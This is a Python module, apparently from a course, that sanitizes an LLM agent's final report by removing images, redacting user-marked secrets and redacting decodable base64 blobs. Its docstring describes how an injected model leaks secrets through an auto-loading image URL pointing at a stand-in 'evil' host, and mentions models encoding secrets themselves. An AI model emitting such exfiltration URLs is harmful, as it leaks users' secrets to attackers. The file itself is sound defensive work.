"""
W07D3 L3 — output guard: deterministic rules applied to the writer's FINAL report.

L1 (guard.py) constrains CONTROL FLOW (who runs next). This layer constrains CONTENT at
the point of harm: whatever the model was talked into, these rules decide what actually
leaves the system. Pure functions, no network, no LangChain -> unit-testable offline.

Three rules (the LLM-judge backstop is a separate, later step):

  1. strip_images        Remove ALL markdown/HTML images. Images auto-load, so a URL like
                         ![x](https://evil/log?d=<secret>) leaks with ZERO user clicks
                         (the classic exfil channel). A text research report needs no images,
                         so this is default-deny, not an allowlist.
  2. redact_sensitive    Redact values the user marked sensitive in the QUESTION
                         (password / secret / token / api key / email ... in the same
                         sentence) from the report, incl. url-encoded and base64 forms.
  3. redact_b64_blobs    Redact base64-looking blobs that decode to printable text. Catches
                         a secret the model encoded itself — models often encode WRONG, so
                         exact-match on the planted encoding misses it (seen: exfil case 4).

Known limits (be honest in the write-up):
  - Rule 2 is a heuristic registry built from the user's own message. A production system
    should register secrets from an authoritative source (vault/env/fields marked
    sensitive), plus a known-format scanner (sk-..., AKIA..., JWT). Not done here.
  - Echoing the user's own secret back to the same user is not a cross-principal leak; the
    off-channel cases (image URL, encoded blob) are what this layer is gated on.
  - Plain external links are kept (citations are legitimate); only images auto-load.
"""

from __future__ import annotations

import base64
import binascii
import re
import urllib.parse
from dataclasses import dataclass, field

REDACTED = "[REDACTED]"
IMAGE_REMOVED = "[external image removed]"


@dataclass
class GuardResult:
    text: str
    events: list = field(default_factory=list)  # human-readable findings; empty = untouched


# ---------------------------------------------------------------------------
# Rule 1 — images
# ---------------------------------------------------------------------------

_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")        # ![alt](url)
_MD_IMAGE_REF = re.compile(r"!\[[^\]]*\]\[[^\]]*\]")    # ![alt][ref]
_HTML_IMG = re.compile(r"<img\b[^>]*>", re.IGNORECASE)  # <img src=...>


def strip_images(text: str) -> tuple[str, list]:
    events = []
    for name, rx in (("markdown image", _MD_IMAGE), ("markdown image ref", _MD_IMAGE_REF), ("html img", _HTML_IMG)):
        text, n = rx.subn(IMAGE_REMOVED, text)
        if n:
            events.append(f"removed {n} {name}(s)")
    return text, events


# ---------------------------------------------------------------------------
# Rule 2 — values the user marked sensitive
# ---------------------------------------------------------------------------

_CUES = re.compile(
    r"password|passwd|secret|token|api[ _-]?key|credential|confidential|private[ _-]key|e-?mail",
    re.IGNORECASE,
)
_TOKEN = re.compile(r"[A-Za-z0-9][A-Za-z0-9_\-.@+/]{7,}")
_SEGMENTS = re.compile(r"(?<=[.!?])\s+|\n+")


def extract_sensitive_values(question: str) -> list:
    """Secret-looking tokens (>=8 chars, letters AND digits) in any sentence that carries a
    sensitivity cue word. Deliberately narrow: false positives redact legit content."""
    values = set()
    for seg in _SEGMENTS.split(question or ""):
        if not _CUES.search(seg):
            continue
        for tok in _TOKEN.findall(seg):
            tok = tok.rstrip(".-_/+@")
            if len(tok) >= 8 and re.search(r"[A-Za-z]", tok) and re.search(r"\d", tok):
                values.add(tok)
    return sorted(values, key=len, reverse=True)


def _variants(value: str) -> list:
    raw = value.encode()
    out = {value, urllib.parse.quote(value, safe=""), urllib.parse.quote_plus(value)}
    for enc in (base64.b64encode, base64.urlsafe_b64encode):
        b = enc(raw).decode()
        out.update({b, b.rstrip("=")})
    return sorted(out, key=len, reverse=True)


def redact_sensitive(text: str, values: list) -> tuple[str, list]:
    events = []
    for v in values:
        hits = 0
        for variant in _variants(v):
            text, n = re.subn(re.escape(variant), REDACTED, text, flags=re.IGNORECASE)
            hits += n
        if hits:
            events.append(f"redacted user-marked sensitive value ({hits}x, len={len(v)})")
    return text, events


# ---------------------------------------------------------------------------
# Rule 3 — base64 blobs that decode to text
# ---------------------------------------------------------------------------

_B64_TOKEN = re.compile(r"(?<![A-Za-z0-9+/=_-])[A-Za-z0-9+/_-]{16,}={0,2}(?![A-Za-z0-9+/=_-])")


def _is_b64_text(tok: str) -> bool:
    # Letters AND a digit: base64 of text virtually always has both; plain words/slugs
    # ("how-to-hash-passwords-properly") never qualify. The printable-decode check below
    # does the real filtering (hex digests, ids etc. decode to non-printable bytes).
    if not (re.search(r"[A-Za-z]", tok) and re.search(r"\d", tok)):
        return False
    s = tok.replace("-", "+").replace("_", "/")
    try:
        raw = base64.b64decode(s + "=" * (-len(s) % 4), validate=True)
    except (binascii.Error, ValueError):
        return False
    if len(raw) < 8:
        return False
    return sum(32 <= b < 127 for b in raw) / len(raw) >= 0.9


def redact_b64_blobs(text: str) -> tuple[str, list]:
    n = 0

    def _sub(m):
        nonlocal n
        if _is_b64_text(m.group(0)):
            n += 1
            return REDACTED
        return m.group(0)

    out = _B64_TOKEN.sub(_sub, text)
    return out, ([f"redacted {n} base64 blob(s) decoding to text"] if n else [])


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def sanitize_output(text: str, question: str = "") -> GuardResult:
    """Apply all rules to the final report. Order matters: sensitive values first (so a
    value inside an image URL is still counted), then images, then generic base64."""
    events: list = []
    values = extract_sensitive_values(question)
    text, ev = redact_sensitive(text, values)
    events += ev
    text, ev = strip_images(text)
    events += ev
    text, ev = redact_b64_blobs(text)
    events += ev
    return GuardResult(text=text, events=events)
